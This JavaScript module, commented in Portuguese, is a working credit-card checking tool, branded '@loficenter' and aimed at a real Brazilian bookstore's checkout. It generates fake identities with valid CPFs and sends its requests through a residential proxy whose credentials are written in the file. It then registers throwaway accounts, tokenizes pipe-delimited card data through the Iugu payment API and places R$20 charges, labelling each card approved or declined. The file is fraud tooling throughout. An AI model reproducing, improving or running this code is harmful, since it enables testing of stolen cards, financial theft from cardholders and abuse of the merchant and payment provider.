import axios from 'axios';
import chalk from 'chalk';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { faker } from '@faker-js/faker'; // Biblioteca atualizada para gerar dados falsos
import cpf from 'cpf';
import tough from 'tough-cookie';       // Biblioteca para gerar CPFs válidos

const  cookieJar = new tough.CookieJar();
// Função para gerar um nome completo aleatório
function gerarNomeCompleto() {
    const primeiroNome = faker.person.firstName();
    const sobrenome = faker.person.lastName();
    return `${primeiroNome} ${sobrenome}`;
}

// Função para gerar um e-mail aleatório
function gerarEmail(nomeCompleto) {
    const nomePartes = nomeCompleto.toLowerCase().split(' ');
    const email = `${nomePartes[0]}.${nomePartes[1]}@exemplo.com`;
    return email;
}

// Função para gerar um CPF aleatório válido
function gerarCPF() {
    return cpf.generate().replace(/[.-]/g, '');  // Gera um CPF válido
}

// Função para gerar um número de telefone aleatório
function gerarTelefone() {
    const ddd = faker.number.int({ min: 11, max: 99 }); // DDD aleatório
    const numero = faker.phone.number('9####-####');    // Formato de celular
    return `(${ddd}) ${numero}`;
}

// Função para gerar todas as informações
function gerarInformacoes() {
    const nomeCompleto = gerarNomeCompleto();
    const email = gerarEmail(nomeCompleto);
    const documentoCPF = gerarCPF();
    const telefone = gerarTelefone();

    return {
        nome: nomeCompleto,
        email: email,
        cpf: documentoCPF,
        telefone: telefone
    };
}

// Gerar e exibir informações
const dadosGerados = gerarInformacoes();
//console.log(dadosGerados);
// Configuração do proxy
const proxyConfig = {
    protocol: 'http',
    host: 'rp.proxyscrape.com',
    port: 6060,
    auth: {
        username: 'gtku4x1qu1knwy3-country-br-state-saopaulo',
        password: 'uda8bixlivodm9f'
    }
};
const proxyAgent = new HttpsProxyAgent(`http://${proxyConfig.auth.username}:${proxyConfig.auth.password}@${proxyConfig.host}:${proxyConfig.port}`);


// Exemplo de uso



function getCardType(cardNumber) {
    // Remove espaços ou hífens no número do cartão, caso existam
    const cleanCardNumber = cardNumber.replace(/[\s-]/g, '');

    // Verifica se é Visa (começa com 4 e tem 13 ou 16 dígitos)
    if (/^4\d{12}(\d{3})?$/.test(cleanCardNumber)) {
        return 'visa';
    }

    // Verifica se é Mastercard (começa com 51-55 ou 22-27 e tem 16 dígitos)
    if (/^5[1-5]\d{14}$/.test(cleanCardNumber) || /^2[2-7]\d{14}$/.test(cleanCardNumber)) {
        return 'master';
    }

    // Se não é Visa nem Mastercard
    return 'Unknown Card Type';
}

// Exemplo de uso


// Função de compra
async function makePurchase(numberGG, monthGG, yearGG, cvvGG) {
    const startTime = Date.now();  // Captura o tempo de início

    try {

        const cardType = getCardType(numberGG);
        //   console.log(`O tipo de cartão é: ${cardType}`);


        const addProduct = await axios.get('https://paulinas.badiu21.com.br/financ/ecommerce/shop/integration/index', {
            params: {
                'productcode': '300.0001.0001.0001.0001.0000.0000.55.001.034'
            },
            headers: {
                'Host': 'paulinas.badiu21.com.br',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://universo.paulinas.com.br/',
                'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
            },
            maxRedirects: 0,
            validateStatus: function (status) {
                // Considera qualquer status entre 200 e 302 como válido (não erro)
                return status >= 200 && status <= 302;
            },
            httpsAgent: proxyAgent,
        });
        let fatura = addProduct.headers['location'];

        const setCookies = addProduct.headers['set-cookie'];

        if (setCookies) {
            setCookies.forEach(cookie => {
                //console.log(cookie);
                cookieJar.setCookieSync(cookie, 'https://paulinas.badiu21.com.br'); // Armazenando os cookies
            });
        }
 
        // Verificando os cookies armazenados
        const cookies = cookieJar.getCookiesSync('https://paulinas.badiu21.com.br');

        const regex1 = /transactionid=(\d+)/;
        const faturaUrl = fatura.match(regex1);

        if (!faturaUrl[1]) {
            return console.log('Sem fatura"');  // 99666
        }
       const response = await axios.post(
           'https://paulinas.badiu21.com.br/system/service/process',
           {
               'transactionid': faturaUrl[1],
               '_service': 'badiu.financ.ecommerce.checkout.linkcontroller',
               '_function': 'finishShopping',
               'cuponcode': ''
           },
           {
               headers: {
                   'Host': 'paulinas.badiu21.com.br',
                   'sec-ch-ua-platform': '"Windows"',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                   'Accept': 'application/json, text/plain, */*',
                   'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                   'Content-Type': 'application/json;charset=UTF-8',
                   'sec-ch-ua-mobile': '?0',
                   'Origin': 'https://paulinas.badiu21.com.br',
                   'Sec-Fetch-Site': 'same-origin',
                   'Sec-Fetch-Mode': 'cors',
                   'Sec-Fetch-Dest': 'empty',
                   'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                   cookies
               },
               httpsAgent: proxyAgent,
           }
       );


  //    const response1 = await axios.post(
  //        'https://paulinas.badiu21.com.br/system/service/process',
  //        {
  //            'username': dadosGerados.email,
  //            'password': '',
  //            'name': '',
  //            'addpassword': '',
  //            'personalphonemobile': '',
  //            'nationalitystatus': 'native',
  //            'transactionid': faturaUrl[1],
  //            '_service': 'badiu.local.paulinas.ecommerce.loginsingin.formcontroller',
  //            '_function': 'checkUsername'
  //        },
  //        {
  //            headers: {
  //                'Host': 'paulinas.badiu21.com.br',
  //                'sec-ch-ua-platform': '"Windows"',
  //                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  //                'Accept': 'application/json, text/plain, */*',
  //                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
  //                'Content-Type': 'application/json;charset=UTF-8',
  //                'sec-ch-ua-mobile': '?0',
  //                'Origin': 'https://paulinas.badiu21.com.br',
  //                'Sec-Fetch-Site': 'same-origin',
  //                'Sec-Fetch-Mode': 'cors',
  //                'Sec-Fetch-Dest': 'empty',
  //                'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
  //                cookies
  //            },
  //            httpsAgent: proxyAgent,
  //        }
  //    );

       //  console.log(response1.data);


       const responseResgister = await axios.post(
           'https://paulinas.badiu21.com.br/system/service/process',
           {
               'username': dadosGerados.email,
               'password': '',
               'name': dadosGerados.nome,
               'addpassword': 'loppesofc1@',
               'personalphonemobile': 'loppesofc1@',
               'nationalitystatus': 'native',
               'transactionid': faturaUrl[1],
               '_service': 'badiu.local.paulinas.ecommerce.loginsingin.formcontroller',
               '_function': 'execSingin'
           },
           {
               headers: {
                   'Host': 'paulinas.badiu21.com.br',
                   'sec-ch-ua-platform': '"Windows"',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                   'Accept': 'application/json, text/plain, */*',
                   'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                   'Content-Type': 'application/json;charset=UTF-8',
                   'sec-ch-ua-mobile': '?0',
                   'Origin': 'https://paulinas.badiu21.com.br',
                   'Sec-Fetch-Site': 'same-origin',
                   'Sec-Fetch-Mode': 'cors',
                   'Sec-Fetch-Dest': 'empty',
                   'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                   cookies
               },
               httpsAgent: proxyAgent,
           }
       );

       const paymentCard = await axios.post(
           'https://paulinas.badiu21.com.br/system/service/process',
           {
               'transactionid': faturaUrl[1],
               'paymethodcheckoutid': 1,
               '_service': 'badiu.fgateway.iugu.checkoutcreditcard.formcontroller'
           },
           {
               headers: {
                   'Host': 'paulinas.badiu21.com.br',
                   'sec-ch-ua-platform': '"Windows"',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                   'Accept': 'application/json, text/plain, */*',
                   'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                   'Content-Type': 'application/json;charset=UTF-8',
                   'sec-ch-ua-mobile': '?0',
                   'Origin': 'https://paulinas.badiu21.com.br',
                   'Sec-Fetch-Site': 'same-origin',
                   'Sec-Fetch-Mode': 'cors',
                   'Sec-Fetch-Dest': 'empty',
                   'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                   cookies
               },
               httpsAgent: proxyAgent,
           }
       );


       const iuguCard = await axios.get(`https://api.iugu.com/v1/payment_token?method=credit_card&data[number]=${numberGG}&data[verification_value]=${cvvGG}&data[first_name]=ASDA&data[last_name]=AS+DAS&data[month]=${monthGG}&data[year]=20${yearGG}&data[brand]=visa&data[fingerprint]=6dd7e852-8509-d2e6-33c6-139885af3e7b&data[version]=2.1&account_id=2E9D640D80F54658B192EE3899BF9D58&callback=callback1729758128795`, {
           headers: {
               'Host': 'api.iugu.com',
               'sec-ch-ua-platform': '"Windows"',
               'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
               'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
               'sec-ch-ua-mobile': '?0',
               'accept': '*/*',
               'sec-fetch-site': 'cross-site',
               'sec-fetch-mode': 'no-cors',
               'sec-fetch-dest': 'script',
               'referer': 'https://paulinas.badiu21.com.br/',
               'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
           }
       });



       let data1 = iuguCard.data;
       // console.log(data1)
       const regex = /"id":"([a-z0-9-]+)"/i;
       const match = data1.match(regex);

       if (!match) {
           console.log(match[1]);  // ecd7e31f-56b0-4816-9341-f1353f3dd1f1
       }


       const payment = await axios.post(
           'https://paulinas.badiu21.com.br/system/service/process',
           {
               'token': match[1],
               '_service': 'badiu.system.core.functionality.form.service',
               '_key': 'badiu.fgateway.iugu.checkoutcreditcard.add',
               'transactionid': faturaUrl[1],
               'paymethodcheckoutid': '1'
           },
           {
               headers: {
                   'Host': 'paulinas.badiu21.com.br',
                   'sec-ch-ua-platform': '"Windows"',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                   'Accept': 'application/json, text/plain, */*',
                   'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                   'Content-Type': 'application/json;charset=UTF-8',
                   'sec-ch-ua-mobile': '?0',
                   'Origin': 'https://paulinas.badiu21.com.br',
                   'Sec-Fetch-Site': 'same-origin',
                   'Sec-Fetch-Mode': 'cors',
                   'Sec-Fetch-Dest': 'empty',
                   'Referer': 'https://paulinas.badiu21.com.br/fgateway/iugu/checkout/creditcard/add?transactionid=99659&paymethodcheckoutid=1',
                   'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                   cookies
               },
               httpsAgent: proxyAgent,
           }
       );

       // console.log(payment.data);
       if (payment.data.status == 'accept') {
           //  console.log(payment.data)
           cookieJar.removeAllCookiesSync();
           return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${payment.data.message.message} R$ 20,00 💸 |[@loficenter] `;
       } else {
           cookieJar.removeAllCookiesSync();
           return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${payment.data.message.generalerror} - [@loficenter]`
       }
    } catch (error) {
        console.log(error)
        if (error.response.data[1]) {
            cookieJar.removeAllCookiesSync();

            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Transação negada - [@loficenter]`
        } else {
            cookieJar.removeAllCookiesSync();

            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Transação negada - [@loficenter]`
        }
        //let returnError = error.response.data.data
        //console.log(returnError)
        //if ( returnError.data.gateway_response_code == 'N7' || returnError.data.gateway_response_code == '51') {
        //    return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${returnError.data.status}|${returnError.data.gateway_response_code} 💸 |[@loficenter] `));
        //  } else { 
        //   return console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${error.response.data.message} - [@loficenter]`))
        //  }
    }
}

async function executeFlow(value) {
    try {
        const [numberGG, monthGG, yearGG, cvvGG] = value.split('|');
        const yearSplited = yearGG.split('20')[1];
        
        if (value.startsWith('466')) {
            console.log('O cartão começa com 466');
            // console.log(numberGG,monthGG,yearSplited,cvvGG)
            //return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno -  GATEWAY OFFLINE - `
    
            let respoonse = await makePurchase(numberGG, monthGG, yearSplited, cvvGG);
            return respoonse
            
          } else {
            console.log('O cartão não começa com 466');
             return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - GATE APENAS PARA AS 466 - [@loficenter]`
          }

    } catch (error) {
        console.error('Erro no fluxo principal:', error);
    }
}

export default executeFlow

